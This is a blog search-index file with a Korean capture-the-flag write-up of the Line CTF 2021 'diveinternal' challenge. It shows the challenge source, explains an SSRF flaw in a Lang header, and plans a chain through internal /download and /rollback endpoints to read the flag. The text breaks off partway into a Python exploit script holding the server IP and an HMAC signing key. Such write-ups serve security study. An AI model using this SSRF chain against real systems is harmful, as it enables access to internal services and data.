<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Line CTF 2021 Write Up</title>
      <link href="2021/03/21/2021-03-21-Line-CTF-2021/"/>
      <url>2021/03/21/2021-03-21-Line-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-diveinternal-50-pts"><a href="#Web-diveinternal-50-pts" class="headerlink" title=" (Web) diveinternal [50 pts]"></a><span style="color:#21C587"></span> (Web) diveinternal [50 pts]</h2><blockquote><p>diveinternal 문제는 SSRF 취약점을 이용해 플래그를 획득하는 문제입니다.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.env.NODE_ENV == <span class="string">&#x27;local&#x27;</span>) &#123; <span class="comment">//set the environment value before your running this app</span></span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).config();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> target = process.env.TARGET_HOST;</span><br><span class="line"><span class="keyword">var</span> test = process.env.TEST;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  request(&#123;</span><br><span class="line">    headers: req.headers,</span><br><span class="line">    uri: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/`</span>,</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;apis&#x27;</span> , <span class="attr">data</span>: data.body&#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/coin&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  request(&#123;</span><br><span class="line">        headers: req.headers,</span><br><span class="line">        uri: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/coin`</span>,</span><br><span class="line">      &#125;).pipe(res);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  router.get(<span class="string">&#x27;/addsub&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    request(&#123;</span><br><span class="line">          </span><br><span class="line">          uri: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/addsub`</span>,</span><br><span class="line">          qs: &#123;</span><br><span class="line">            email: req.query.email,</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).pipe(res);</span><br><span class="line">    &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>위 코드는 <code>api</code>인데 <code>$&#123;target&#125;</code>의 값을 이용해서 요청 보내는 것을 볼 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TEST&#x3D;test</span><br><span class="line">TARGET_HOST&#x3D;localhost:5050</span><br></pre></td></tr></table></figure><p>또한 <code>TARGET_HOST</code>의 값은 로컬호스트인 것을 보아 내부 서버로 요청을 보내는 것을 알 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">FROM node:lts-alpine as base</span><br><span class="line"></span><br><span class="line">ADD .&#x2F;src &#x2F;src</span><br><span class="line">WORKDIR &#x2F;src</span><br><span class="line">COPY &#x2F;src&#x2F;package*.json &#x2F;</span><br><span class="line">EXPOSE 3000</span><br><span class="line"></span><br><span class="line">FROM base as production</span><br><span class="line">ENV NODE_ENV&#x3D;production</span><br><span class="line">ENV TARGET_HOST&#x3D;private:5000</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">RUN npm ci</span><br><span class="line">COPY . &#x2F;</span><br><span class="line">CMD [&quot;node&quot;, &quot;bin&#x2F;www&quot;]</span><br><span class="line"></span><br><span class="line">FROM base as dev</span><br><span class="line">ENV NODE_ENV&#x3D;development</span><br><span class="line">ENV DEBUG&#x3D;frontend:*</span><br><span class="line">ENV TARGET_HOST&#x3D;private:5000</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">COPY . &#x2F;</span><br><span class="line">CMD [&quot;nodemon&quot;, &quot;bin&#x2F;www&quot;]</span><br><span class="line"></span><br><span class="line">FROM base as local</span><br><span class="line">ENV NODE_ENV&#x3D;development</span><br><span class="line">ENV DEBUG&#x3D;frontend:*</span><br><span class="line">ENV TARGET_HOST&#x3D;localhost:5050</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">COPY . &#x2F;</span><br><span class="line">CMD [&quot;nodemon&quot;, &quot;bin&#x2F;www&quot;]</span><br></pre></td></tr></table></figure><p>도커 파일을 확인해보면 <code>5050</code> 포트만 열려 있는 건 아니고, <code>5000</code>번 포트도 열려 있는 것을 볼 수 있습니다. 즉, 사용할 수 있는 내부 서버는 localhost:5050, localhost:5000 총 2개가 존재합니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RunRollbackDB</span>(<span class="params">dbhash</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.environ[<span class="string">&#x27;ENV&#x27;</span>] == <span class="string">&#x27;LOCAL&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> dbhash <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dbhash is None&quot;</span></span><br><span class="line">        dbhash = <span class="string">&#x27;&#x27;</span>.join(e <span class="keyword">for</span> e <span class="keyword">in</span> dbhash <span class="keyword">if</span> e.isalnum())</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;backup/&#x27;</span>+dbhash):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Where is file?&quot;</span></span><br></pre></td></tr></table></figure><p>그리고 일단 제일 중요한 플래그를 읽는 조건을 보면 현재 서버의 환경변수가 <code>LOCAL</code>이 아니여야하고, <code>&#39;backup/&#39; + dbahsh</code>라는 파일이 존재한다면 <code>FLAG</code> 파일을 읽고, 반환해주는 것을 볼 수 있습니다. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/coin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coin</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = app.response_class()</span><br><span class="line">        language = LanguageNomarize(request)</span><br><span class="line">        response.headers[<span class="string">&quot;Lang&quot;</span>] =  language</span><br><span class="line">        data = getCoinInfo()</span><br><span class="line">        response.data = json.dumps(data)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        err = <span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno)</span><br><span class="line">        logger.error(err)</span><br></pre></td></tr></table></figure><p>첫 번째로 <code>api</code> 서버에서 <code>/coin</code>으로 요청을 보내면 <code>LanguageNomarize()</code> 함수의 반환 값을 <code>Lang</code>이라는 헤더에 넣어주고, <code>getCoinInfo()</code> 함수를 이용해서 코인의 정보를 가져와 응답해주는 것을 볼 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LanguageNomarize</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;en&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        regex = <span class="string">&#x27;^[!@#$\\/.].*/.*&#x27;</span> <span class="comment"># Easy~~</span></span><br><span class="line">        language = request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        language = re.sub(<span class="string">r&#x27;%00|%0d|%0a|[!@#$^]|\.\./&#x27;</span>, <span class="string">&#x27;&#x27;</span>, language)</span><br><span class="line">        <span class="keyword">if</span> re.search(regex,language):</span><br><span class="line">            <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = requests.get(request.host_url+language, headers=request.headers)</span><br><span class="line">            <span class="keyword">if</span> data.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> data.text</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>LanguageNomarize()</code> 함수를 보면 <code>Lang</code>이라는 헤더가 존재하면 헤더의 값을 정규식으로 검사를 하고, <code>requests.get()</code> 함수를 이용해서 요청을 보내는 것을 볼 수 있습니다. 여기서 <code>request.host_url</code>과 <code>language</code>의 값은 우리가 조작할 수 있기 때문에 원하는 곳으로 요청을 보낼 수 있기 때문에 SSRF 취약점이 발생합니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/integrityStatus&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">integritycheck</span>():</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;db&#x27;</span>:<span class="string">&#x27;database/master.db&#x27;</span>,<span class="string">&#x27;dbhash&#x27;</span>:activity.dbHash&#125;</span><br><span class="line">    data = json.dumps(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>두 번째는 <code>/integrityStatus</code>를 확인해보겠습니다. 해당 경로로는 <code>api</code> 서버와 통신하지 않기 때문에 우리가 일반적으로는 요청을 보낼 수 없습니다. 하지만 SSRF 취약점을 이용하면 <code>/integrityStatus</code>로 요청을 해서 <code>dbhash</code>의 값을 알아낼 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rollback&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rollback</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Sign&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> SignCheck(request):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Key&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">        result  = activity.IntegrityCheck(request.headers.get(<span class="string">&#x27;Key&#x27;</span>),request.args.get(<span class="string">&#x27;dbhash&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        err = <span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno)</span><br><span class="line">        logger.error(err)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;error&#x27;</span>]), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>세 번째는 <code>/rollback</code>을 보면 <code>SignCheck()</code>의 값이 참이고, <code>Key</code>라는 헤더 값이 존재하면 <code>IntegrityCheck()</code> 메서드를 호출하는 것을 볼 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntegrityCheck</span>(<span class="params">self,key, dbHash</span>):</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.integrityKey == key:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> self.dbHash != dbHash:</span><br><span class="line">        flag = RunRollbackDB(dbHash)</span><br><span class="line">        logger.debug(<span class="string">&#x27;DB File changed!!&#x27;</span>+dbHash)</span><br><span class="line">        file = <span class="built_in">open</span>(os.environ[<span class="string">&#x27;DBFILE&#x27;</span>],<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        self.dbHash = hashlib.md5(file).hexdigest()</span><br><span class="line">        self.integrityKey = hashlib.sha512((self.dbHash).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;DB is safe!&quot;</span></span><br></pre></td></tr></table></figure><p><code>IntegrityCheck()</code> 메서드를 보면 <code>self.integrityKey</code>의 값과 <code>Key</code>의 값이 동일하고, <code>self.dbHash</code> 값과 <code>dbHash</code>의 값이 동일 하지 않으면 <code>RunRollbackDB()</code> 함수를 실행시켜 주는 것을 볼 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RunRollbackDB</span>(<span class="params">dbhash</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.environ[<span class="string">&#x27;ENV&#x27;</span>] == <span class="string">&#x27;LOCAL&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> dbhash <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dbhash is None&quot;</span></span><br><span class="line">        dbhash = <span class="string">&#x27;&#x27;</span>.join(e <span class="keyword">for</span> e <span class="keyword">in</span> dbhash <span class="keyword">if</span> e.isalnum())</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;backup/&#x27;</span>+dbhash):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Where is file?&quot;</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        logger.error(<span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;exception!!&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>RunRollbackDB()</code>는 아까 위에서 봤다 시피 <code>backup/dbhash</code> 파일이 존재하면 <code>FLAG</code> 파일을 읽고, 반환해주는 함수입니다. </p><p>그래서 처음에는 다음과 같은 시나리오를 세웠었습니다.</p><ul><li>시나리오 1</li></ul><ol><li>SSRF 취약점을 이용해서 <code>/integrityStatus</code>로 요청을 보내 <code>dbHash</code>의 값을 가져옴</li><li>가져온 dbHash 값을 이용해서 <code>/rollback</code>으로 요청을 보내서 FLAG를 읽음</li><li>FLAG는 <code>lang</code>이라는 헤더 값으로 반환이 됨</li></ol><p>하지만 위 시나리오를 이용해서 익스를 하려 했지만 <code>IntegrityCheck()</code> 함수에서 <code>self.dbHash</code>의 값과 <code>dbHash</code>의 값이 동일하면 안 되기 때문에 공격을 할 수 없었습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WriteFile</span>(<span class="params">url</span>):</span></span><br><span class="line">    local_filename = url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> requests.get(url, stream=<span class="literal">True</span>) <span class="keyword">as</span> r:</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;backup/&#x27;</span>+local_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">8192</span>): </span><br><span class="line">                f.write(chunk)</span><br></pre></td></tr></table></figure><p>그래서 다시 코드를 분석해보니, <code>WriteFile()</code> 함수를 이용해서 <code>backup/</code> 아래에 파일을 만들어주는 것을 볼 수 있었습니다. 그래서 <code>WriteFile</code> 함수를 이용해서 아무 파일을 하나 생성해주고, 해당 파일의 이름을 <code>dbHash</code>로 전송해주면 클래스 내에 있는 변수인 <code>self.dbHash</code>의 값과 동일하지 않고, 또 <code>backup/</code> 아래에 존재하기 때문에 충분히 우회해서 플래그를 읽을 수 있습니다.</p><p><code>WriteFile()</code> 함수 내부를 보면  <code>requests.get()</code> 함수를 이용해서 요청을 보내고, <code>url.split(&#39;/&#39;)[-1]</code>의 값을 파일 이름으로 사용해 생성하고 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Sign&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> SignCheck(request):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            src = request.args.get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> valid_download(src):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;false&#x27;</span>))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> valid_download(request.form[<span class="string">&#x27;src&#x27;</span>]):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;false&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        WriteFile(src)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;success&#x27;</span>))</span><br></pre></td></tr></table></figure><p><code>WriteFile()</code> 함수는 <code>/download</code>에서 호출을 하는데 이때, <code>Sign</code>이라는 헤더 값이 존재하고, <code>SignCheck()</code> 함수의 반환 값이 참이고, <code>src</code> 파리미터의 값이 존재하면 <code>WriteFile()</code> 함수를 실행시켜줍니다.</p><ul><li>시나리오 2</li></ul><ol><li>SSRF 취약점을 이용해서 /download로 요청을 보내서 임의의 파일을 생성함.</li><li>또 다시 SSRF 취약점을 이용해서 /rollback로 요청을 보내 <code>FLAG</code>를 읽음 </li><li>이때 해당 파일의 이름을 이용해서 <code>self.dbHash != dbHash</code> 구문을 우회함.</li><li>마지막으로 <code>lang</code> 헤더를 읽으면 됨.</li></ol><ul><li>주의점</li></ul><ol><li>파일을 생성할 때, <code>requests.get()</code> 함수를 이용해서 요청을 보내기 때문에 파일을 만들 때, <code>URL</code>을 전송해서 만들어주어야 함.</li><li><code>RunRollbackDB()</code> 함수 내에서 <code>dbHash</code>의 값을 한 번 더 파싱하는데, 이때 <code>e.isalnum()</code>의 값이 참이어야 함.</li><li>플래그를 읽을 때, 환경 변수 <code>ENV</code>의 값이 <code>Local</code>이 아니여야 하기 때문에 <code>5050</code> 포트가 아닌 <code>5000</code> 포트를 사용해주어야 함.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://35.200.63.50/apis/&#x27;</span></span><br><span class="line"></span><br><span class="line">Key = hashlib.sha512((<span class="string">&#x27;ed05a1c7ff6428dcf8d50901b6e78ba3&#x27;</span>).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">print(<span class="string">&#x27;[+] Key  : &#x27;</span> + Key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">KEY</span>):</span></span><br><span class="line">    privateKey = <span class="string">b&#x27;let\&#x27;sbitcorinparty&#x27;</span></span><br><span class="line">    EN = hmac.new( privateKey , KEY.encode(<span class="string">&#x27;utf-8&#x27;</span>), hashlib.sha512 )</span><br><span class="line">    <span class="keyword">return</span> EN.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 